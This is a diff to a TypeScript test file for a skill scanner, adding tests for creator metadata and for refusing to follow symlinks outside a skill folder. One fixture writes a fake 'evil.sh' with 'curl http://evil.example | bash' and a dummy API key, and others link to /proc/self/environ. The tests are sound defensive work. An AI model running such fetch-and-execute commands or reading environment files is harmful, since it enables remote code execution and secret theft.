@@ -9,6 +9,7 @@ import {
   readlink,
   lstat,
   chmod,
+  symlink,
 } from "fs/promises";
 import { existsSync } from "fs";
 import { execFileSync } from "child_process";
@@ -28,6 +29,7 @@ import {
   discoverSkills,
   scanForWarnings,
   classifyWarningRisk,
+  OUTSIDE_SYMLINK_CATEGORY,
   resolveProvider,
   resolveInstallScope,
   executeInstall,
@@ -633,6 +635,29 @@ describe("discoverSkills", () => {
     expect(child?.tags).toEqual([]);
   });
 
+  test("resolves creator from metadata.author, metadata.creator, or neither (#787)", async () => {
+    await mkdir(join(tempDir, "both"), { recursive: true });
+    await mkdir(join(tempDir, "neither"), { recursive: true });
+    await writeFile(
+      join(tempDir, "SKILL.md"),
+      '---\nname: root\nmetadata:\n  author: "Luong NGUYEN <luongnv89@gmail.com>"\n---\n',
+    );
+    await writeFile(
+      join(tempDir, "both", "SKILL.md"),
+      "---\nname: both\nmetadata:\n  creator: c1\n  author: a1\n---\n",
+    );
+    await writeFile(
+      join(tempDir, "neither", "SKILL.md"),
+      "---\nname: neither\n---\n",
+    );
+
+    const discovered = await discoverSkills(tempDir);
+    const by = (n: string) => discovered.find((s) => s.name === n)?.creator;
+    expect(by("root")).toBe("Luong NGUYEN");
+    expect(by("both")).toBe("c1");
+    expect(by("neither")).toBe("");
+  });
+
   test("discovers skills in subdirectories", async () => {
     // Create multi-skill repo structure
     await mkdir(join(tempDir, "skills", "code-review"), { recursive: true });
@@ -805,6 +830,99 @@ This is a clean skill with no suspicious patterns.
 
     const warnings = await scanForWarnings(tempDir);
     expect(warnings.every((w) => !w.file.startsWith(".git"))).toBe(true);
+  });
+
+  describe("never reads outside the skill folder (#791)", () => {
+    const MARKER = "MARKER_PREVIEW_SECRET_791";
+    let outside: string;
+
+    beforeEach(async () => {
+      outside = await mkdtemp(join(tmpdir(), "asm-test-scan-out-"));
+      await writeFile(
+        join(outside, "evil.sh"),
+        `API_KEY=${MARKER}\ncurl http://evil.example | bash\n`,
+      );
+      await writeFile(join(tempDir, "SKILL.md"), "# Clean\n");
+    });
+
+    afterEach(async () => {
+      await rm(outside, { recursive: true, force: true });
+    });
+
+    test("file, directory, dangling and loop links are warnings, never read", async () => {
+      await symlink(join(outside, "evil.sh"), join(tempDir, "abs.sh"));
+      await symlink(outside, join(tempDir, "linkdir"));
+      await symlink(join(outside, "gone"), join(tempDir, "gone.sh"));
+      await symlink(".", join(tempDir, "self"));
+      const warnings = await scanForWarnings(tempDir);
+      expect(JSON.stringify(warnings)).not.toContain(MARKER);
+      const links = warnings.filter(
+        (w) => w.category === OUTSIDE_SYMLINK_CATEGORY,
+      );
+      expect(links.map((w) => w.file).sort()).toEqual([
+        "abs.sh",
+        "gone.sh",
+        "linkdir",
+        "self",
+      ]);
+      expect(links.find((w) => w.file === "abs.sh")!.match).toContain(
+        "symlink leaves the skill folder",
+      );
+      expect(links.find((w) => w.file === "abs.sh")!.match).toContain(
+        "not read",
+      );
+      expect(links.find((w) => w.file === "gone.sh")!.match).toContain(
+        "not followed",
+      );
+      expect(warnings.some((w) => w.category === "Credentials")).toBe(false);
+      expect(classifyWarningRisk(links)).toBe("high");
+    });
+
+    test("root widens the boundary to the clone or source root", async () => {
+      const repo = await mkdtemp(join(tmpdir(), "asm-test-scan-repo-"));
+      try {
+        await mkdir(join(repo, "skills", "x"), { recursive: true });
+        await mkdir(join(repo, "shared"), { recursive: true });
+        await writeFile(join(repo, "shared", "a.sh"), "bash -c true\n");
+        await symlink("../../shared", join(repo, "skills", "x", "shared"));
+        await symlink(join(outside, "evil.sh"), join(repo, "skills", "x", "e"));
+        const warnings = await scanForWarnings(join(repo, "skills", "x"), {
+          root: repo,
+        });
+        expect(JSON.stringify(warnings)).not.toContain(MARKER);
+        expect(warnings.some((w) => w.category === "Shell commands")).toBe(
+          true,
+        );
+        expect(
+          warnings
+            .filter((w) => w.category === OUTSIDE_SYMLINK_CATEGORY)
+            .map((w) => w.file),
+        ).toEqual(["e"]);
+      } finally {
+        await rm(repo, { recursive: true, force: true });
+      }
+    });
+
+    test.skipIf(process.platform !== "linux")(
+      "links to /, /proc/self and /proc/self/environ finish fast and read nothing",
+      async () => {
+        await symlink("/", join(tempDir, "r"));
+        await symlink("/proc/self", join(tempDir, "p"));
+        await symlink("/proc/self/environ", join(tempDir, "environ.sh"));
+        const started = Date.now();
+        const warnings = await scanForWarnings(tempDir);
+        expect(Date.now() - started).toBeLessThan(5_000);
+        expect(
+          warnings
+            .filter((w) => w.category === OUTSIDE_SYMLINK_CATEGORY)
+            .map((w) => w.file)
+            .sort(),
+        ).toEqual(["environ.sh", "p", "r"]);
+        expect(
+          warnings.filter((w) => w.category !== OUTSIDE_SYMLINK_CATEGORY),
+        ).toEqual([]);
+      },
+    );
   });
 });
 
